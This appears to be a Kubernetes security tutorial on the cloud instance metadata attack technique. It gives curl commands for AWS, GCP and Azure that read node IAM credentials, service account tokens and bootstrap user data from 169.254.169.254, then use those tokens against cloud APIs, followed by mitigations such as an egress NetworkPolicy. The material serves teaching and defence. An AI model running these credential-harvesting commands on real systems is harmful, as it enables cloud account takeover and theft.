# Instance Metadata API

An attacker who gains code execution inside a pod on a cloud-managed Kubernetes cluster can reach the underlying node's instance metadata service — a non-routable HTTP endpoint that cloud providers make available at a well-known address. This endpoint can expose IAM credentials, instance identity documents, network configuration, and bootstrap secrets.

> **Note:** This technique requires a cloud-managed Kubernetes cluster (AKS, EKS, GKE, etc.) and cannot be fully demonstrated on a local Kind cluster. The commands below are provided as a conceptual walkthrough and reference.

## Description

Cloud providers provide instance metadata service for retrieving information about the virtual machine, such as network configuration, disks, and SSH public keys. This service is accessible to the VMs via a non-routable IP address (`169.254.169.254`) that can be accessed from within the VM only. Attackers who gain access to a container may query the metadata API service to gather information about the underlying node — including short-lived IAM credentials that can then be used to pivot into the cloud control plane.

The impact varies by cloud provider but commonly includes:

- Retrieving IAM role credentials (AWS), workload identity tokens (GCP), or managed identity tokens (Azure).
- Reading node-level metadata such as region, instance type, and hostname.
- Discovering attached storage volumes or network interfaces.
- Fetching user data scripts that may contain secrets embedded at cluster bootstrap time.

## Prerequisites

- A pod running on a cloud-managed Kubernetes node (EKS, GKE, or AKS).
- `kubectl exec` access to the pod, or an existing reverse shell from the pod.
- `curl` available inside the pod (most base images include it).

## Conceptual Walkthrough

### AWS — IMDSv1 (no authentication)

IMDSv1 requires no token. Any process on the node — including containers — can query it directly.

```bash
# Retrieve available metadata categories
curl -s http://169.254.169.254/latest/meta-data/

# Get the IAM role name attached to the node
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve the temporary IAM credentials for that role
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}
```

Example output:

```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",
  "Token": "IQoJb3JpZ2luX2VjEJr...",
  "Expiration": "2024-01-15T16:00:00Z"
}
```

With these credentials an attacker can configure the AWS CLI and operate against the cloud account:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEJr..."
aws sts get-caller-identity
aws s3 ls
```

Retrieve additional node metadata:

```bash
# Instance identity document (region, account ID, instance ID)
curl -s http://169.254.169.254/latest/dynamic/instance-identity/document

# User data — may contain cluster bootstrap secrets
curl -s http://169.254.169.254/latest/user-data/
```

### AWS — IMDSv2 (token-required, harder but still accessible from a pod)

IMDSv2 requires a PUT request to obtain a session token first. It is still accessible from within a container unless the hop limit has been lowered to 1 and the pod is not on the host network.

```bash
# Obtain an IMDSv2 session token (TTL = 21600 seconds = 6 hours)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use the token for all subsequent requests
curl -s -H "X-aws-ec2-metadata-token: ${TOKEN}" \
     http://169.254.169.254/latest/meta-data/

# Retrieve IAM credentials
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: ${TOKEN}" \
            http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: ${TOKEN}" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}
```

### GCP — Metadata Server

GCP requires a `Metadata-Flavor: Google` header. The metadata server exposes service account tokens that can be used against GCP APIs.

```bash
# List all available metadata endpoints
curl -s -H "Metadata-Flavor: Google" \
     http://169.254.169.254/computeMetadata/v1/?recursive=true

# Retrieve the default service account token
curl -s -H "Metadata-Flavor: Google" \
     "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Retrieve the full identity token (JWT) for the node's service account
curl -s -H "Metadata-Flavor: Google" \
     "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com"

# Read instance attributes — may contain bootstrap data
curl -s -H "Metadata-Flavor: Google" \
     http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true
```

Use the access token against GCP APIs:

```bash
ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# List GCS buckets in the project
curl -s -H "Authorization: Bearer ${ACCESS_TOKEN}" \
     https://storage.googleapis.com/storage/v1/b?project=YOUR_PROJECT_ID
```

### Azure — Instance Metadata Service (IMDS)

Azure requires the `Metadata: true` header.

```bash
# Retrieve full instance metadata
curl -s -H "Metadata: true" \
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool

# Obtain an access token for the Azure Resource Manager API
curl -s -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
     | python3 -m json.tool
```

Use the access token to enumerate Azure resources:

```bash
ACCESS_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

SUBSCRIPTION_ID="YOUR_SUBSCRIPTION_ID"
curl -s -H "Authorization: Bearer ${ACCESS_TOKEN}" \
     "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resources?api-version=2021-04-01" \
     | python3 -m json.tool
```

## Defenses and Mitigations

- **AWS**: Configure IMDSv2 with a hop limit of `1`. This prevents containerized workloads (which traverse an additional network hop) from reaching the metadata service. Use IAM Roles for Service Accounts (IRSA) instead of node-level instance profiles.
- **GCP**: Use Workload Identity to bind Kubernetes service accounts to GCP service accounts. Disable the default service account or remove the `cloud-platform` scope from node pools.
- **Azure**: Use Azure AD Workload Identity. Restrict access to IMDS from within pods using network policies.
- **All providers**: Apply egress network policies that explicitly deny traffic to `169.254.169.254/32` from pod CIDRs.

```yaml
# Example: NetworkPolicy to block IMDS access
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-imds
  namespace: default
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32
```

## Resources

- [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
- [GCP Instance Metadata](https://cloud.google.com/compute/docs/storing-retrieving-metadata)
- [AWS Instance Metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
- [AWS IMDSv2 Announcement](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)
- [MITRE ATT&CK - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
- [MITRE ATT&CK - Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)
- [GKE Workload Identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
- [AWS IRSA](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)
